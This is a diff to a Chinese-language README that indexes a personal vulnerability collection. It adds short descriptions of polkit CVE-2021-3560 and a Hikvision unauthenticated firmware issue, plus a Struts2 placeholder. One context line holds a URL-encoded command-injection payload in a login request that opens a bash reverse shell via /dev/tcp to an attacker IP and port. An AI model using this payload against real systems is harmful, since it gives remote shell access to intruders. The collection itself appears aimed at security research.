@@ -57,3 +57,29 @@ op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200
 ```
 
 </details>
+
+## 四、[*polkit-CVE-2021-3560*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/polkit-CVE-2021-3560)
+
+<details>
+<summary><em>点击以展开 *polkit-CVE-2021-3560介绍 </em></summary>
+> 该漏洞存在于系统服务Polkit中，因为Polkit被Systemd所调用，因此默认安装了Systemd的发行版都会使用Polkit。
+> 该漏洞成因是执行dbus-send命令后在认证完成前强制终止引发错误，而Polkit未正确处理错误导致允许无特权的用户添加一个sudo用户。
+
+| 影响 OS | 参考链接 |
+---- | ----
+RHEL 8						|[Link](https://access.redhat.com/security/cve/CVE-2021-3560)
+Fedora 21 (or later)		|[Link](https://bugzilla.redhat.com/show_bug.cgi?id=1967424)
+Debian testing (“bullseye”)	|[Link](https://security-tracker.debian.org/tracker/CVE-2021-3560)
+Ubuntu 20.04				|[Link](https://ubuntu.com/security/CVE-2021-3560)
+
+</details>
+
+## 五、[*Hikvision Unauth*](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Hikvision%20Unauth)
+
+<details>
+<summary><em>点击以展开 *Hikvision Unauth介绍 </em></summary>
+- 海康威视固件未授权下载及解密分析：
+	- [相关博客](https://about.sentrylab.cn/help/Hikvision-BinConfigurationFiles-decrypter/)
+</details>
+
+## 六、Struts2 待完成
